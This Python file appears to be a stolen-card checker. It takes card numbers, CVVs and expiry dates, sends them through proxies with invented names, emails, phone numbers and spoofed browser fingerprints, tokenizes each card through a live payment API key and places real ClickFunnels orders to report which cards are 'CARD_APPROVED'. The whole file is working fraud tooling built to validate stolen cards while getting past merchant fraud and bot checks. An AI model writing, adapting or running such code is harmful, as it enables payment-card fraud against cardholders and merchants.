import requests
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent

fake = Faker()

def generate_random_email():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()

def _run_adyen_auth_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = proxy_str
        if not proxy_url.startswith(('http://', 'https://')):
            proxy_url = f"http://{proxy_url}"
        session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        
    name = fake.name()
    email = generate_random_email()
    ua = generate_user_agent()
    
    headers1 = {
        'authority': 't.cometlytrack.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.clickfunnels.com',
        'referer': 'https://www.clickfunnels.com/',
        'user-agent': ua,
    }
    json_data1 = {
        'fingerprint': '09207158521d4a5ca00896c0e024f2f3',
        'comet_token': '2942493487149889343233890852493992791010990969429',
        'event': 'phone_changed',
        'json_data': {
            'phone': '07 58 83 99 29',
        },
        'url': 'https://www.clickfunnels.com/scale-monthly-step-2',
        'referrer': 'https://www.clickfunnels.com/scale-monthly-step-1',
        'fbp': 'fb.1.1780439334199.14120841984468307',
        'device_type': 'mobile',
        'os': 'Android',
        'browser': None,
        'language': 'fr-FR',
        'in_iframe': False,
    }
    
    try:
        session.post(
            'https://t.cometlytrack.com/e/t',
            params={'space_id': '3377699765000018'},
            headers=headers1,
            json=json_data1,
            timeout=15
        )
    except Exception as e:
        print(f"[Adyen] Cometlytrack error: {e}")
        
    headers2 = {
        'authority': 'api-order.payments.ai',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer pk_live_oSLT21YBfpfTp6TqUF5JCZX4vxMenFyjAAjUiso',
        'content-type': 'application/json',
        'origin': 'https://framepay.payments.ai',
        'reb-api-consumer': 'Rebilly/framepay@framepay.payments.ai_48f95c8',
        'referer': 'https://framepay.payments.ai/',
        'user-agent': ua,
    }
    json_data2 = {
        'method': 'payment-card',
        'billingAddress': {
            'firstName': name,
            'lastName': name,
            'emails': [
                {
                    'label': 'Emails',
                    'value': email,
                },
            ],
        },
        'riskMetadata': {
            'fingerprint': '6c7e7f14406ffcfa0003606def35f4e5',
            'extraData': {
                'kountFraudSessionId': '5e427901a1684fc794d2863982ef898d',
            },
            'browserData': {
                'colorDepth': 24,
                'isJavaEnabled': False,
                'language': 'fr-FR',
                'screenHeight': 889,
                'screenWidth': 400,
                'timeZoneOffset': -120,
                'isAdBlockEnabled': False,
            },
        },
        'leadSource': {
            'path': 'https://www.clickfunnels.com/scale-monthly-step-2',
        },
        'paymentInstrument': {
            'pan': cc,
            'cvv': cvv,
            'expYear': ano,
            'expMonth': mes,
        },
    }
    
    try:
        token_resp = session.post(
            'https://api-order.payments.ai/organizations/79e29172-59dd-4f18-82d6-28758d4a89fa/tokens',
            headers=headers2,
            json=json_data2,
            timeout=15
        )
        if token_resp.status_code not in (200, 201):
            return False, f"Tokenization failed: {token_resp.text}"
        token_data = token_resp.json()
        uwu = token_data.get('id')
        if not uwu:
            return False, "Failed to get Rebilly token ID"
    except Exception as e:
        return False, f"Tokenization error: {str(e)}"
        
    headers3 = {
        'authority': 'www.clickfunnels.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.clickfunnels.com',
        'referer': 'https://www.clickfunnels.com/scale-monthly-step-2',
        'user-agent': ua,
        'x-cf2-post-type': 'submit',
    }
    json_data3 = {
        'billing_same_as_shipping': True,
        'product': True,
        'contact': {
            'email': email,
            'phone_number': '+33758839929',
            'first_name': name,
            'last_name': name,
        },
        'billing_address_attributes': {
            'city': None,
            'region_name': None,
            'country_id': 'FR',
            'postal_code': '10080',
        },
        'purchase': {
            'product_variants': [
                {
                    'id': '4177901',
                    'quantity': 1,
                    'price_id': '3820654',
                },
                {
                    'id': '119714',
                    'quantity': 1,
                    'price_id': '1298890',
                },
            ],
            'payment_method_id': None,
            'payment_method_type': 'payment-card',
            'rebilly_token': uwu,
            'process_new_order': True,
        },
        'skip_billing_address': False,
        'skip_optin_track': False,
        'redirect_to': '/onboarding-calls',
    }
    
    try:
        order_resp = session.post(
            'https://www.clickfunnels.com/scale-monthly-step-2',
            cookies=session.cookies,
            headers=headers3,
            json=json_data3,
            timeout=25
        )
        resp_text = order_resp.text
        
        if "just a moment..." in resp_text.lower() or "cloudflare" in resp_text.lower():
            return False, "Cloudflare Blocked"
            
        try:
            resp_json = order_resp.json()
        except Exception:
            resp_json = {}
            
        if 'error' in resp_json or 'error_details' in resp_json:
            error_msg = resp_json.get('error')
            if not error_msg and resp_json.get('error_details'):
                error_msg = resp_json.get('error_details')[0].get('message')
            if not error_msg:
                error_msg = "Declined"
            return False, error_msg
            
        if "error" in resp_text.lower():
            return False, "Declined"
            
        if order_resp.status_code in (200, 201) and "error" not in resp_text:
            return True, "CARD_APPROVED"
            
        return False, resp_text[:100]
    except Exception as e:
        return False, f"Order submission error: {str(e)}"

async def process_adyen_auth(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_adyen_auth_sync, cc, mes, ano, cvv, proxy_str)
